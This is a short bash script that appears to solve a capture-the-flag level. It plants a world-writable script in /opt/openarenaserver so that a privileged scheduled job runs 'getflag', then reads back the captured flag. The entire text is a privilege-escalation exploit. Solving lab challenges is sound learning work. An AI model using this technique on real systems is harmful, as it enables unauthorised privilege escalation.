#!/bin/bash

echo '#!/bin/bash' > /opt/openarenaserver/run.sh ; \
chmod 777 /opt/openarenaserver/run.sh ; \
echo "getflag > /opt/openarenaserver/psswflag" >> /opt/openarenaserver/run.sh ; \
sleep 130 ; \
echo ready ; \
cat /opt/openarenaserver/psswflag
